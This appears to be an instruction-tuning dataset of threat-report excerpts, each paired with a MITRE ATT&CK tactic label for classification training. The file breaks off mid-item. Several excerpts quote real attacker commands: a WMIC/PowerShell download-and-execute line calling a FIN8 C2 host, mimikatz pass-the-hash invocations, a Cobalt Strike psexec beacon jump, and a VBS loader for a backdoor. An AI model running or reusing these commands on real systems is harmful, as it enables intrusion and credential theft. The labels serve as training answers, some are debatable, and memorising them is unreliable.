        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Our findings allow us to attribute this attack to the Earth Kitsune threat actor with medium confidence. Injecting malicious scripts into North Korean-related websites shows a similar modus operandi and victimology to the previous activities of the group. Furthermore, the delivery server and the C&C server of WhiskerSpy used in this attack have two infrastructure overlaps with our previous research onOperation Earth Kitsune.\nThe first overlap we noticed is that both WhiskerSpy's C&C domain londoncity[.]hopto[.]org and Earth Kitsune's domain rs[.]myftp[.]biz were resolved to the same IP address 45[.]76[.]62[.]198. \nThe second overlap is that WhiskerSpy's C&C domains londoncity[.]hopto[.]org and updategoogle[.]servehttp[.]com, plus the domain of the delivery server microsoftwindow[.]sytes[.]net were all resolved to 172[.]93[.]201[.]172. This IP address was also mapped from the domain selectorioi[.]ddns[.]net which was used by Earth Kitsune's agfSpy backdoor.",
        "output": "other",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: If the desktop.ini does not exist in the path C:\\Users\\Public\\Favorites\\desktop.ini (indicating that the backdoor is not yet installed), the VBS code \nEvacuation and Humanitarian Documents used to Spear Phish Ukrainian Entities | Mandiant | Google Cloud Blog within dovidka.chm drops the decoded next payload to C:\\Users\\Public\\ignit.vbs. The code then creates \nFigure 4: Lure Image \nThe VBS file ignit.vbs mentioned in figure 4, drops three files: \n%STARTUP%\\Windows Prefetch.lNk (MD5: 8fc42ee971ab296f921bb05633f6b4a6) LNK used to achieve persistence for the payload via the Startup folder Note: the unusual capitalization is hardcoded   \nC:\\Users\\Public\\Favorites\\desktop.ini (MD5: a9dcaf1c709f96bc125c8d1262bac4b6) Helper file to launch the payload, core.dll \nEvacuation and Humanitarian Documents used to Spear Phish Ukrainian Entities | Mandiant | Google Cloud Blog \nC:\\Users\\Public\\Libraries\\core.dll (MD5:   \nd2a795af12e937eb8a89d470a96f15a5)   \nFollow-on payload Compile Timestamp: 2022-01- 31T15:00:46.000 $^+$ 0000   \nLoads in memory: \n047fbbb380cbf9cd263c482b70ddb26f \nEither via the LNK after startup, or directly via the VBS, the command line \"wscript.exe //B //E:vbs C:\\Users\\Public\\Favorites\\desktop.ini\" is executed, referencing the helper file dropped by the sample mentioned above. Finally, the file C:\\Users\\Public\\ignit.vbs is deleted after execution. \n\"desktop.ini\" is used to invoke regasm.exe to launch the payload found in C:\\Users\\Public\\Libraries\\core.dll as a hidden window without returning any error codes. \nThe entire contents of this file are: \nSet fso $=$ CreateObject(\"Scripting.FileSyst execPath $=$ \"C:\\Windows\\Microsoft.NET\\Frame Set shell $=$ CreateObject(\"Wscript.Shell\") shell.run(execPath), 0, false \nThe file C:\\Users\\Public\\Libraries\\core.dll is a malicious .NET file packed with an unknown obfuscator which may be related to Confuser. This samples drops an additional malicious payload into memory and executes it. \nclient.dll   \n(MD5:047fbbb380cbf9cd263c482b70ddb26f) Description: MICROBACKDOOR backdoor C&C: xbeta.online:8443 \nThe payload (MD5: \n047fbbb380cbf9cd263c482b70ddb26f) is a sample of MICROBACKDOOR. This backdoor malware has capabilities such as manipulating files (list/get/put), execute commands, can automatically update itself, and take screenshots. This family also supports HTTP, Socks4 and Socks5 proxies to route traffic. \nMICROBACKDOOR is an open source project written by cr4sh, aka Dmytro Oleksiuk. As with other MICROBACKDOOR samples previously used by UNC1151, this sample appears to have had the screenshot functionality added. \nOnce run, the MICROBACKDOOR payload would reach out to 'xbeta.online:8443'. It would transmit a packet of data every 10 seconds. ",
        "output": "execution",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Mallox ransomware group has been more active in the past few months, and their recent recruiting efforts may enable them to attack more organizations if the recruitment drive is successful.\nOrganizations should implementsecurity best practicesand be prepared to defend against theongoing threat of ransomware. This is true not only for Mallox ransomware but for other opportunistic criminal groups as well.\nThe Unit 42 team recommends making sure that all internet-facing applications are configured properly and all systems are patched and up to date wherever possible. These measures will help to reduce the attack surface, thereby limiting the exploitation techniques available to attackers.\nDeploy an XDR/EDR solution to perform in-memory inspection and detect process injection techniques. Perform threat hunting, looking for signs of unusual behavior related to security product defense evasion, service accounts for lateral movement and domain administrator-related user behavior.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attacker was quite adept with Exchange and immediately listed various organization configuration settings via PowerShell. Below are a few of the operations that the attacker executed. \nGet a list of users on the Exchange server and their current role using GetManagementRoleAssignment: \nC:\\Windows\\system32\\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command \"Get-ManagementRoleAssignment -GetEffectiveUsers | select Name,Role,EffectiveUserName,AssignmentMethod,IsValid | ConvertTo-Csv - NoTypeInformation | % {\\$_ -replace '\\`n','_'} | Out-File C:\\temp\\1.xml\" \nRetrieve information about the configured Virtual Directory using GetWebServicesVirtualDirectory: \nC:\\Windows\\system32\\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command \"Get-WebServicesVirtualDirectory | Format-List\" \nThe attacker also made use of a file called sqlceip.exe, which upon first glance might appear as the legitimate version of SQL Server Telemetry Client provided by Microsoft. However, Volexity determined this tool was actually a version of AdFind from joeware.net. AdFind is a command-line tool used for querying and extracting data from Active Directory. During the course of its investigations, Volexity discovered the attacker using AdFind with the following command line: \nC:\\Windows\\system32\\cmd.exe /C sqlceip.exe -default -f (name $|=^{\\prime}$ \"Organization Management\") member -list | sqlceip.exe -f objectcategory $\\v{m}=\\v{k}>$ .\\SettingSync\\log2.txt ",
        "output": "other",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The malware implements several methods to exfiltrate information, including uploading data via FTP and three variants of HTTP-based communication mechanisms. A number of different HTTP connectors act as helpers, trying various methods in case one of them is restricted by local security policies or security software. These three methods are: \nDirect TCP connection and HTTP session via Winsock library HTTP session via Urlmon.dll HTTP session via invisible instance of Internet Explorer as OLE object ",
        "output": "exfiltration",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: As the world becomes accustomed to living with COVID-19, people are increasingly having to prove they are vaccinated, often via the use of so-called digital vaccine passports containing their identity and vaccination record. Employers, restaurants, even the neighborhood bar are relying on this system to be secure, accurate, and to maintain user privacy. The person using the passport is also expecting the same thing.\nWith a lack of federal guidance or global policy, it has been left up to country, state, or even local municipalities to decide what passes as an \"official\" vaccine passport. Without clear requirements, the private and public sector providers of vaccine passport apps must tackle evaluating a technology and workflow that includes collecting the minimum amount of medical data and personal identifiable information (PII) required to prove vaccination records are legitimate.\nSymantec, a division ofBroadcom Software, took a look at how these digital vaccine passports work and the potential security risks and threat scenarios they present.",
        "output": "other",
        "source": "Symentec"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Qbot attempted to steal credentials from the Credentials Manager.\nOn one of the targeted systems, the injected explorer process opened a handle with suspicious access rights to a thread in the LSASS process. Credential dumping tools like Mimikatz often request this level of access and corresponds to the following access rights:\nPROCESS_VM_READ (0x0010) \nPROCESS_QUERY_INFORMATION (0x0400) \nPROCESS_QUERY_LIMITED_INFORMATION (0x1000) \nPROCESS_ALL_ACCESS (0x1fffff)\nWe observed the LSASS process interaction from the injected Explorer process at two different access levels, 0x1410:\nIn addition, on one host, the average LSASS interaction, with access right 0x1FFFFF (PROCESS_ALL_ACCESS) by the explorer process was ~13K every two hours. A significant volume of events.\nThe article \"You Bet Your Lsass: Hunting LSASS Access\" by Splunk details examples of LSASS credential dumping.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Affected platforms:LinuxImpacted parties:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity level:Critical\nIn June 2023, FortiGuard Labs detected the propagation of several DDoS botnets exploiting the Zyxel vulnerability (CVE-2023-28771). This vulnerability is characterized by a command injection flaw affecting multiple firewall models that could potentially allow an unauthorized attacker to execute arbitrary code by sending a specifically crafted packet to the targeted device. The severity of this flaw, rated 9.8 on the CVSS scoring system, was reported by researchers fromTRAPA Security. Zyxel released asecurity advisoryregarding this vulnerability on April 25, 2023. Subsequently, the Cybersecurity and Infrastructure Security Agency (CISA) added this security flaw to itsKnown Exploited Vulnerabilities(KEV) catalog in May. Through the capture of exploit traffic, the attacker's IP address was identified, and it was determined that the attacks were occurring in multiple regions, including Central America, North America, East Asia, and South Asia.\nSince the publication of theexploit module,there has been a sustained surge in malicious activity. Analysis conducted by FortiGuard Labs has identified a significant increase in attack bursts starting from May, as depicted in the trigger count graph shown in Figure 1. We also identified multiple botnets, including Dark.IoT, a variant based on Mirai, as well as another botnet that employs customized DDoS attack methods. In this article, we will provide a detailed explanation of the payload delivered through CVE-2023-28771 and associated botnets.",
        "output": "other",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: First introduced by Apple in macOS Yosemite, SIP-also known as \"rootless\"- essentially locks down the system from root by leveraging the Apple sandbox to protect the entire platform. Internally, it is controlled by the following NVRAM variables: \ncsr-active-config: bitmask of enabled protections csr-data: stores netboot configuration \nThese variables cannot be legitimately modified in non-recovery mode. Therefore, the only legitimate way to disable SIP is by booting into recovery mode and turning SIP off. Turning SIP on or off is done using the built-in csrutil tool, which can also display the SIP status: \nThe csr-active-config bitmask NVRAM variable describes the different protections SIP offers. While not an exhaustive list, below are a few honorable mentions; the rest can be freely examined in the XNU source code: \nCompromising any of these protections could enable attackers to bypass SIP completely. Some scenarios include the following: \nLoading untrusted kernel extensions could compromise the kernel and allow the said extensions to perform operations without any checks \nMicrosoft finds new macOS vulnerability, Shrootless, that could bypass System Integrity Protection | Microsoft Security Blog Bypassing filesystem checks could allow a kernel extension to enforce SIP to itself completely Freely modifying the NVRAM could control SIP itself ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors used theSMBprotocol to move laterally after compromising the beachhead. They specifically copied then23.dll(Cobalt Strike) file to theC:\\ProgramDatapath and then ran it.\nWe can confirm that the file was copied and then launched via the new service by examining the various host's system logs for event id 7045.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We also observed the threat actors utilizing for loops to iterate through text files located in the C:\\ProgramData directory. These files contained the hostname of all workstations and servers within the network environment. The aim of this loop was to execute discovery commands using ping to locate live endpoints and net view to enumerate their open shares. In addition, they used the dir command to test the feasibility of connecting to remote servers within the network through the local administrator's account.\nIn addition to using net view to find open shares, the attackers also examined the registry of the local host and saved a list of all mapped shares in a text file called 1.txt. We also observed them using the wmic command to execute the same action on a remote host.\nThey later viewed and deleted the text file using the type and del commands respectively.\nTo check the status of the antimalware software that is installed, they used PowerShell along with theGet-MpComputerStatuscmdlet. This command was run on multiple hosts in the environment. We believe the execution of this command came throughatexec.py, which is part of the impacket collection.\nAdFind was used in this intrusion, however, the threat actors limited the output only to collect operating system information and specific attributes from the domain user objects.\nWe also observed some other miscellaneous commands that we tend to see in every intrusion. These discovery commands collected information about the administrator groups and users. Although, there was one notable use of the tasklist command where threat actors used the /S parameter to retrieve the list of currently running processes from remote hosts.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: CISA observed the threat actor using the techniques identified in table 9 for collection within the victim environment. ",
        "output": "collection",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Silk Typhoon has pursued initial access attacks against targets of interest through development of zero-day exploits or discovering and targeting vulnerable thirdparty services and software providers. Silk Typhoon has also been observed gaining initial access via compromised credentials. The software or services targeted for initial access focus on IT providers, identity management, privileged access management, and RMM solutions. \nIn January 2025, Silk Typhoon was also observed exploiting a zero-day vulnerability in the public facing Ivanti Pulse Connect VPN (CVE-2025-0282). Microsoft Threat Intelligence Center reported the activity to Ivanti, which led to a rapid resolution of the critical exploit, significantly reducing the period that highly skilled and sophisticated threat actors could leverage the exploit. ",
        "output": "initial access",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Since its emergence in 2021, the Mallox group has kept the same approach to gaining initial access: The group targets unsecured MS-SQL servers to infiltrate a network. These attacks start with a dictionary brute force attack, trying a list of known or commonly used passwords against the MS-SQL servers. After gaining access, the attackers use a command line and PowerShell to download the Mallox ransomware payload from a remote server (see Figure 4).\nA command line example used for a Mallox ransomware infection:\nThis command line does the following:\nDownloads the ransomware payload from:hxxp://80.66.75[.]36/aRX.exe, and saves it astzt.exe \nRuns a PowerShell script namedupdt.ps1\nThe payload then goes on to do the following (not pictured in the command line script shown above):\nDownloads another file namedsystem.bat, and saves it astzt.bat \nThetzt.batfile is used to create a user namedSystemHelpand enable the remote desktop (RDP) protocol \nExecutes the ransomware payloadtzt.exeusing Windows Management Instrumentation (WMI)\nFigure 5 below shows how Cortex XDR and XSIAM detect one of the first phases of the SQL server exploitation, as described above.",
        "output": "initial access",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: About one and a half hours after initial access, IcedID reached out to two Cobalt Strike servers.\nProcess injection was used multiple times across the environment using Cobalt Strike Beacons.\nPrior to executing the ransomware, the threat actors created a GPO to disable Windows Defender across all systems/OUs.\nThe GPO was named \"new\".",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Threat Actors deployed Nokoyawa ransomware from one of the servers using WMI and PsExec. They first copied the ransomware binary,k.exe, and a batch script p.bat using WMI:\nCommand spawned by WmiPrvSE.exe:\nA snippet of SMB network traffic generated by the above command:\nThe p.bat is a simple batch script that runs the k.exe binary with a Base64 encoded configuration:\nThe redacted parameter used by the `config` flag decodes to:\nThe decoded configuration file shows the ransomware extension, the note name, and the note content encoded in Base64. The threat actors also configured a number of directories and extensions to skip, and enabled network and hidden drives encryption. The DELETE_SHADOW was set to true, in order to delete volume shadow copies.\nBased on the configuration parameters being passed via command line and the code written in C++, the deployment appears to be part of the1.1 version of the Nokoyawacode base:\nRansomware sample code signature:\nDebug information shows that the binary was generated a few hours before the encryption:\nThe ransomware was then deployed at scale using PsExec to encrypt the Windows domain:\nA ransom message was left in each directory where files were encrypted.\nAfter encryption, contact was made with the threat actors using their support site and the price of the ransom was quoted at ~$200,000 USD in Bitcoin. No ransom was paid as a result of this intrusion.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Finally, dumped data was compressed using the utility tool rar.exe. The compressed data mostly comprised of the extracted .pst files, along with memory dumps. \n\\c\\$\\root\\&echo [S]&cd&echo [E] ",
        "output": "exfiltration",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Discovery phase was carried out in this case using both native Windows tools, and external tools such as AdFind and PowerSploit. Initial discovery was performed using various Windows utilities. After dumping thelsass.exeprocess on the beachhead machine, the threat actors then launchedaf.exe(AdFind) to find all user objects and computers in the domain.\nSystem utilities used for discovery included:\nThroughout the intrusion, the threat actor kept on trying to view a file named sh.txt.\nThe file appears to have been the intended output for execution of theInvoke-ShareFindercommand. Execution of the command was visible in the PowerShell 4103 and 4104 logs.\nInvoke-Sharefoinderis a module in thePowerSploitframework. This command, in particular, can find (non-standard) shares on hosts in the local domain.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Net and Nltest commands were used to gather network and domain reconnaissance. During the intrusion, this activity was seen multiple times, on multiple hosts.\nOther discovery commands included:\nAdFind.exe and adf.bat were uploaded to the beachhead. adf.bat was used to execute:\nAdFind results were written to the following locations:\nOn the beachhead, Cobalt Strike executed BloodHound in memory. The results were saved in:\nBloodHound was later executed on the domain controller as well. Once again the results were stored in:\nPowerSploit was loaded into memory on the DC and the following functions were used:\nAn encoded PowerShell command was executed on the domain controller to enumerate all AD joined hosts and save the results to:\nThe decoded PowerShell command:",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Over the past year, we have observed multiple intrusions with a majority acting as the entry point for data exfiltration andcyber extortion operations.Most of our cases that result in public reportingfocus on ransomware operations and the malware they leverage to attain access. The numbers below do not account for the various RDP brute forces and exploit cases that did not make it to public reporting.\nThe following summarizes the various initial access techniques observed in our cases:\nSimilar to 2021, in 2022, a majority of our cases originated from mass email campaigns that aim to spread malware to various organizations. However, one of the biggest shifts in this space has been the discontinuance of Macro usage in Word and Excel files due toMicrosoft's decisionto disable macros on files downloaded from the internet.\nThreat actors quickly reacted and began shifting to the usage of ISO and ZIP files containing LNK shortcuts to execute initial payloads. We have observed a declining usage of Word and Excel files,however, we observed some malware families delivering Word documents weaponized with exploits such asCVE-2022-30190.Many malware families that previously relied on macros have begun to migrate over to ISO and ZIP files packaging malicious LNK or script files.\nOn the other hand, a few of our cases focused on non-phishing related initial access vectors. One of the most notable isGootloader,which infects users via compromised websites that are infected to boost rankings on search engines via SEO poisoning.In addition, this past year we have also observed the exploitation ofMicrosoft Exchange via ProxyShell and Manage Engine Support Center Plus.\nExchange Exploit Leads to Domain Wide Ransomware \nPHOSPHORUS Automates Initial Access Using ProxyShell\nFinally, we had one case involving thebrute force of an internet accessible SQL Serverthat led to a network compromise. Cases with a non-phishing means of initial access, such as exploitation and RDP brute forcing, may not always result in ransomware. Such intrusions may have other motivations, including pure data theft, deployment of cryptomining software, jump point for another intrusion, or scams.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The C2 server - test[.]softlemon[.]net is the subdomain of softlemon[.]net. The domain softlemon[.]net was registered under Google domains until August 2019 and likely expired since then. The malicious actor re-registered this domain on Aug. 5, 2021. The SSL certificate for the domain softlemon[.]net with the serial number 4aa6af6d719bfdd1c6dff3d7b640aed7ee3was issued by Let's Encrypt, a free SSL certificate provider. \nThe Talos reputation engine has classified it as an untrusted domain and Cisco Umbrella shows a spike in the DNS queries in September 2021. This activity is consistent with the evolution of the Cobalt Strike beacons illustrated earlier the attackers started instrumenting beacons fronted with the Digital News domain at the beginning of September. \nDNS spike for test[.]softlemon[.]net queries vs dates. \nOur research uncovered that the C2 test[.]softlemon[.]net is a Windows server running Internet Information Services (IIS). \nIIS service response rendered from the host test[.]softlemon[.]net. \nAccording to Shodan, the IP address 193[.]135[.]134[.]124 hosted by a Russian provider may be the real C2 IP address protected by the Cloudflare infrastructure as the SSL certificate served on port 8443 belongs to Cloudflare and lists the X509v3 Subject Alternative Name as DNS:\\*.softlemon.net. ",
        "output": "command and control",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Upon initial connection, the threat actor dropped several Windows Batch scripts to disk, including scripts designed to disable security tooling.\nDefenderOFF.bat\nThis batch file contained several registry entries commonly employed by threat actors designed to disable the built in Windows Defender. This particular script included a couple of FOR loops designed to automate disabling key services before the registry statements were made.\nTake, for instance the first FOR loop:\nThe threat actor in this statement is utilizing a tool known as SUCMD (SU64) located in the batch file drive/folder path (%~dp0) to run elevated commands within the batch script. The SU64 tool is a Windows Command Line elevation tool; from the SUCMD project README:\nThis FOR loop iterates through a listing of the following services and stops them using the NET command:\nWinDefend Windows Defender Service \nWdFilter Microsoft Defender Antivirus Mini-Filter Driver \nWdBoot Microsoft Defender Antivirus Boot Driver \nSense Windows Defender Advanced Threat Protection Service (Sense) service \nWdNisDrv Microsoft Defender Antivirus Network Inspection System Driver \nWdNisSvc Microsoft Defender Antivirus Network Inspection Service \nSecurityHealthService Security Health Service/Windows Security Service\nThe script then utilizes the Sysinternals PSKILL64 binary to terminate several security related services. Finally, the script disables the aforementioned services, disables Defender with several registry statements, and hides the Defender settings page from visibility.\nInterestingly enough, the threat actor in this case did not execute this script, preferring to manually run some of the commands (or similar commands) on the system to disable defenses. Of note, two of the third-party tools referenced by the script (SU64 and PSKILL64) were not included in the tool drop.\nDefense REvasion?\nAdditionally interesting, the threat actor dropped (but did not execute) a script to reverse these changes and re-enable Windows Defender, aptly named:DefenderON.bat\nDisabling Windows Defender\nWhile the two files above were dropped, we did not observe their use. However, on initial login to the beachhead, the threat actor issued several commands via the command prompt to disable various features (including notifications) of Windows Defender:",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once MERCURY has obtained access to the target organization, the threat actor establishes persistence using several methods, including: \nDropping a web shell, providing effective and continued access to the compromised device.   \nAdding a user and elevating their privileges to local administrator. Adding the leveraged tools in the startup folders and ASEP registry keys, ensuring their persistence upon device reboot.   \nStealing credentials. \nThe actor leverages the new local administrator user to connect through remote desktop protocol (RDP). During this session, the threat actor dumps credentials by leveraging the open-source application Mimikatz. We also observed MERCURY later performing additional credential dumping in SQL servers to steal other high privileged accounts, like service accounts. ",
        "output": "persistence",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Emotet\nIn the Emotet Excel document, the following URLs are hard coded, and obfuscated, to download the second stage.\nThe second stage of Emotet has a set of hard-coded IPs that it tries to connect to after the DLL is executed.\nCobalt Strike\nEmotet, later on, deployed Cobalt Strike for additional functionality.\nAtera and Splashtop\nThreat actors used Atera and Splashtop remote access tools on two compromised hosts during the intrusion. Atera granted the threat actors with interactive access. We cannot, however, confirm that the threat actors utilized this access because the majority of activity originated through the Cobalt Strike beacons.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The actor or actors responsible for the Travle attack has been active during the last few years, apparently not worried about being tracked by AV companies. Usually, modifications and new additions to their arsenal are discovered and detected quite quickly. Still, the fact that they didn?t really need to change their TTPs during all these years seems to suggest that they don?t need to increase their sophistication level in order to fulfill their goals. What's worse, according to subjects of decoy documents these backdoors are used primarily in the CIS region against government organizations, military entities and companies engaged in high-tech research, which indicates that even high-profile targets still have a long way to go to implement IT-sec best practices which efficiently resist targeted attacks. \nWe detect Travle samples with the following verdicts: \nTrojan.Win32.Tpyn.\\*   \nTrojan.Win32.TravNet.\\*   \nTrojan-Spy.Win32.TravNet.\\*   \nHEUR:Trojan.Win32.Generic   \nHEUR:Trojan.Win32.TravNet.gen   \nHEUR:Backdoor.Win32.NetTraveler.gen ",
        "output": "other",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To move laterally, the threat actors used credentials gathered at the previous stage. If they only had password hashes, they carried out Pass-The-Hash attacks using Mimikatz. \nUse Alternate Authentication Material: Pass the Hash  T1550.002 mimikatz's sekurlsa::pth /user:Administrator /domain:{redacted} /ntlm:{redacted} /run:\"%COMSPEC% /c echo 70c64df2976 > \\\\.\\pipe\\277bf3\" mimikatz's sekurlsa::pth /user: {redacted} /domain:{redacted} /ntlm:{redacted} /run:\"%COMSPEC% /c echo 22074328564 > \\\\.\\pipe\\bce0a1\" \nLateral Tool Transfer  T1570 \njump psexec64 {redacted} dns windows/beacon_dns/reverse_dns_txt (ns1.colunm.tk:53) on {redacted} via Service Control Manager (\\\\[redacted]\\ADMIN\\$\\c3632b3.exe) copy c:\\users\\public\\COMSysUpdate.exe \\\\172.19.97.101\\c\\$\\users\\public\\COMSysUpdate.exe ",
        "output": "lateral movement",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On a workstation that the threat actor moved laterally to, we observed use of named pipes.\nUsually, when observing this behavior from Cobalt Strike, this tends to be usage of the getsystem command to elevate privileges; however, in this case we observed the parent process to not be services.exe and the threat actor was already running as SYSTEM. This activity was seen in correlation to pass-the-hash behavior listed inLateral Movement. The threat actor changed to the context of a domain administrator and then was observed moving laterally again using Cobalt Strike, so we attribute this activity to pass-the-hash command execution activity rather than getsystem.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After their initial reconnaissance, the malicious actors spread across the network expanding their foothold by, primarily, targeting domain controllers. They engaged in lateral movement by using the WMIC utility for remote code execution (a built-in Windows tool). \nwmic.exe /node:<target> process call create \"cmd /c powershell.exe -nop -ep bypass -c \\$pw='b640a9c0e64704e1e202a07774613a29971fe5aa';\\$pa='sys';iex (NewObject System.Net.WebClient).DownloadString('https://104-168-237- 21.sslip[.]io/134af6')\" \nWMIC (wmic.exe) was used to create a remote command prompt instance (cmd.exe), which then executed the PowerShell code. The PowerShell command created two variables and attempted to download and execute the payload from one of FIN8's Command and Control (C&C) servers. This download was blocked by Bitdefender  below description is based on interpretation of variables discovered in our previous analysis of FIN8 operations. \n\\$pw  Probably password to decrypt the downloaded script file. Because download was blocked, we couldn't analyze the script. \n\\$pa  Instructions for malicious framework to impersonate the lsass.exe/vmtoolsd.exe token and inject itself into a new \"svchost.exe -k netsvcs\" process. \nFinally, command line tried to execute (iex is an alias for Invoke-Expression) the code downloaded from the IP address 104[.]168[.]237[.]21. Threat actors abused sslip.io for connection to C&C - a service that provides free IP to domain mapping to make SSL certificate generation easier for traffic encryption. While this service is legitimate and widely used, the malware abused it in an attempt at evading detection when connecting to C&C servers. \nFor one of the machines, a slightly different URL was observed (ending with /edaea0) with the identical $\\$pw$ and $\\$p a$ variables. The scripts downloaded from sslip.io were unavailable at the time of this analysis as the server was down. \nThis attempt was blocked by Bitdefender's command line scanning capability. To avoid the command line scanning, attackers then switched the attack tool to wmiexec.py from Impacket (a collection of Python classes to work with low-level access to packets and network protocols). This Python script connected directly to the target machine (without installing any service/agent on the target machine) and used the valid credentials to execute the code. \nNOTE: As a result of using wmiexec.py, the command lines we noticed on affected machines have specific output redirection such as \\ 1> \\\\127.0.0.1\\ADMIN\\$\\__1621898828.3311949 2>&1. \nAs is often the case with sophisticated adversaries, the attackers tried different methods to bypass the deployed security controls. Via trial and error, they were eventually able to take over some of the servers. One script used by the malicious actors, C:\\Windows\\Temp\\rdp.ps1,was unavailable at the time of this analysis, and we believe it was an attempt to use RDP tunneling (FIN8 has been known to use Plink for RDP tunneling). ",
        "output": "lateral movement",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
